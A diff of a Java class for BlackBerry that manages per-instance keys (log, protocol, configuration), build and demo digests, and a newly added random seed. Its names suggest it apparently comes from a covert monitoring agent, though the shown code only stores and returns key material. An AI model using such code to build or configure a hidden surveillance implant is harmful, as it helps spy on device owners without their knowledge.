@@ -17,6 +17,7 @@ import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.interfaces.iSingleton;
+import blackberry.utils.Utils;
 import fake.InstanceKeysFake;
 
 /**
@@ -37,18 +38,13 @@ public final class Keys implements iSingleton {
     protected byte[] byteProtoKey;
     protected byte[] byteConfKey;
     protected byte[] byteBuildID;
+    protected byte[] byteRandomSeed;
     //private static byte[] byteInstanceID;
     private byte[] byteInstanceID;
     private boolean seven;
 
-    private static byte[] buildDigest = new byte[] { (byte) 0x7f, (byte) 0x9e,
-            (byte) 0x6a, (byte) 0xe, (byte) 0xd9, (byte) 0x96, (byte) 0x54,
-            (byte) 0x58, (byte) 0xd8, (byte) 0xc1, (byte) 0xf1, (byte) 0xa5,
-            (byte) 0x58, (byte) 0x71, (byte) 0x3e, (byte) 0x9d };
-    private static byte[] demoDigest = new byte[] { (byte) 0xba, (byte) 0xba,
-            (byte) 0x73, (byte) 0xe6, (byte) 0x7e, (byte) 0x39, (byte) 0xdb,
-            (byte) 0x5d, (byte) 0x94, (byte) 0xf3, (byte) 0xc6, (byte) 0x7a,
-            (byte) 0x58, (byte) 0xd5, (byte) 0x2c, (byte) 0x52 };
+    private static byte[] buildDigest = Utils.hexStringToByteArray("b1688ffaaaafd7c1cab52e630b53178f");
+    private static byte[] demoDigest = Utils.hexStringToByteArray("863d9effe70187254d3c5e9c76613a99");
 
     //#ifdef DEBUG
     public String log = "";
@@ -153,6 +149,7 @@ public final class Keys implements iSingleton {
         byteLogKey = Arrays.copy(instanceKeys.getLogKey(), 0, 16);
         byteProtoKey = Arrays.copy(instanceKeys.getProtoKey(), 0, 16);
         byteConfKey = Arrays.copy(instanceKeys.getConfKey(), 0, 16);
+        byteRandomSeed = Arrays.copy(instanceKeys.getRandomSeed(), 0, 16);
         byteBuildID = instanceKeys.getBuildID();
         seven = instanceKeys.isSeven();
     }
@@ -192,6 +189,14 @@ public final class Keys implements iSingleton {
     public byte[] getConfKey() {
         return byteConfKey;
     }
+    
+    public  byte[] getRandomSeed() {        
+        return byteRandomSeed;
+    }
+    
+    public byte[] getDemo() {        
+        return instanceKeys.getDemo();
+    }
 
     /**
      * Gets the instance id.
@@ -210,5 +215,9 @@ public final class Keys implements iSingleton {
     public boolean isSeven() {
         return seven;
     }
+
+
+
+
 
 }
